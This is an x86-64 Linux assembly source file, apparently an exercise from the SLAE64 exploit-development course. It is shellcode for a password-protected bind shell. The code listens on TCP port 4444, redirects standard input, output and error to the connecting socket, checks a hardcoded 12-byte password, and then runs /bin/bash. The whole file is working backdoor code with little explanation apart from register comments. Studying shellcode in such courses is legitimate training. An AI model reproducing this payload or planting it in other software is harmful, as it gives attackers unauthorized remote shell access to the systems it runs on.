; Author: Bobby Cooke
; Blog:   https://boku7.github.io/2020/04/06/SLAE64_1_BindShell.html
global _start
section .text
_start:
; int ipv4Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
; rax = 0x29
; rdi = 0x2  = AF_INET
; rsi = 0x1  = SOCK_STREAM
; rdx = 0x0  = IPPROTO_IP
xor rsi, rsi   ; clear rsi
mul rsi        ; clear rax, rdx ; rdx = 0x0 = IPPROTO_IP
add al, 0x29   ; rax = 0x29 = socket syscall
inc rsi        ; rsi = 0x1 = SOCK_STREAM
push rsi
pop rdi        ; rdi = 0x1
inc rdi        ; rdi = 0x2 = AF_INET
syscall        ; socket syscall ; RAX returns socket File-Descriptor
; bind(ipv4Socket, (struct sockaddr*) &ipSocketAddr, sizeof(ipSocketAddr));
; rax = 0x31
; rdi = 0x3  =  ipv4Socket
; rsi = &ipSocketAddr
;          02 00 11 5c 00 00 00 00 00 00 00 00 00 00 00 00
; Address-Family| PORT| IP Address| 8 bytes of zeros
; rdi = 0x10
xchg rdi, rax    ; RDI = sockfd / ipv4Socket
xor rax, rax
add al, 0x31     ; rax = 0x31 = socket syscall
push rdx         ; 8 bytes of zeros for second half of struct
push dx         ; 4 bytes of zeros for IPADDR_ANY
push dx         ; 4 bytes of zeros for IPADDR_ANY
push word 0x5c11 ; push 2 bytes for TCP Port 4444
inc rdx
inc rdx          ; rdx = 0x2 ; dx = 0x0002
push dx          ; 0x2 = AF_INET
add dl, 0xe      ; rdi = 0x10 = sizeof(ipSocketAddr)
mov rsi, rsp     ; rsi = &ipSocketAddr
syscall
; int listen(int sockfd, int backlog);
; rax = 0x32    = listen syscall
; rdi = sockfd  = 0x3 = ipv4Socket
; rsi = backlog = 0
xor rax, rax
add al, 0x32
xor rsi, rsi
syscall
;accept
; rax = 0x2b
; rdi = sockfd  = 0x3 = ipv4Socket
; rsi = 0x0
; rdx = 0x0
xor rax, rax
push rax
push rax
pop rdx
pop rsi
add al, 0x2b
syscall       ; accept returns client socket file-descriptor in RAX
; dup2
xchg rdi, rax    ; RDI = sockfd / ClientSocketFD
xor rsi, rsi
add dl, 0x3      ; Loop Counter
dup2Loop:
xor rax, rax
add al, 0x21     ; RAX = 0x21 = dup2 systemcall
syscall          ; call dup2 x3 to redirect STDIN STDOUT STDERR
inc rsi
cmp rsi, rdx     ; if 2-STDERR, end loop
jne dup2Loop
jmp short password
failer:
; write
; rax = 0x1
; rdi = fd = 0x1 STDOUT
; rsi = &String
; rdx = sizeof(String)
;root# python reverse.py "REALLY?!"
;String length : 8
;!?YLLAER : 213f594c4c414552
xor rdi, rdi
mul rdi
push rdi
pop rsi
push rsi
mov rsi, 0x213f594c4c414552
push rsi
mov rsi, rsp    ; rsi = &String
inc rax         ; rax = 0x1 = write system call
mov rdi, rax
add rdx, 16     ; 16 bytes / size of string
syscall
password:
; write
; rax = 0x1
; rdi = fd = 0x1 STDOUT
; rsi = &String
; rdx = sizeof(String)
;root# python reverse.py "M@G1C WOrDz IZ??"
;String length : 16
;??ZI zDr : 3f3f5a49207a4472
;OW C1G@M : 4f5720433147404d
xor rdi, rdi
mul rdi
push rdi
pop rsi
push rsi
mov rsi, 0x3f3f5a49207a4472
push rsi
mov rsi, 0x4f5720433147404d
push rsi
mov rsi, rsp    ; rsi = &String
inc rax         ; rax = 0x1 = write system call
mov rdi, rax
add rdx, 16     ; 16 bytes / size of string
syscall
; read
; rax = 0x0 = read systemcall
; rdi = fd = 0x0 STDIN
; rsi = Write to &String
; rdx = 0x12 = sizeof(String)
xor rdi, rdi
push rdi
mul rdi         ; rdx =0x0 ; rax = 0x0 = write system call
mov rsi, rsp    ; rsi = [RSP] = &String
add rdx, 12     ; 12 bytes / size of password
syscall
; String = P3WP3Wl4ZerZ
;   String length : 12
;     ZreZ : 5a72655a
;     4lW3PW3P : 346c573350573350
mov rdi, rsp
xor rsi, rsi
add rsi, 0x5a72655a
push rsi
mov rsi, 0x346c573350573350
push rsi
mov rsi, rsp    ; rsi = &String
xor rcx, rcx
add rcx, 0xB
repe cmpsb
jnz failer
;execve
; rax = 0x3b
; rdi = Pointer -> "/bin/bash"0x00
;root# python reverse.py "/bin/bash"
;String length : 9
;h : 68
;sab/nib/ : 7361622f6e69622f
; rsi = 0x0
; rdx = 0x0
xor rsi, rsi
mul rsi          ; rdx&rax= 0x0
xor rdi, rdi
push rdi
add rdx, 0x68
push rdx
mov rdx, 0x7361622f6e69622f ; "/bin/bas"
push rdx
xor rdx, rdx
mov rdi, rsp
mov al, 0x3b
syscall  ; call execve("/bin/bash", NULL, NULL)

